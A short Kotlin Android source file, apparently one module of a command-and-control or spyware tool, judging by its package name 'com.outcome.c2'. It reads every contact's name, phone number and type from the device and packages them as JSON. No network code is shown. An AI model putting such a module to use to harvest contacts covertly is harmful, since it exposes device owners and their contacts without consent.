package com.outcome.c2

import android.content.Context
import android.provider.ContactsContract
import org.json.JSONArray
import org.json.JSONObject

object Contacts {

    fun list(ctx: Context): JSONObject {
        val arr = JSONArray()
        val cursor = ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.TYPE
            ),
            null, null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        )
        cursor?.use {
            while (it.moveToNext()) {
                arr.put(JSONObject().apply {
                    put("name", it.getString(0) ?: "")
                    put("number", it.getString(1) ?: "")
                    put("type", it.getInt(2))
                })
            }
        }
        return JSONObject().put("count", arr.length()).put("contacts", arr)
    }
}
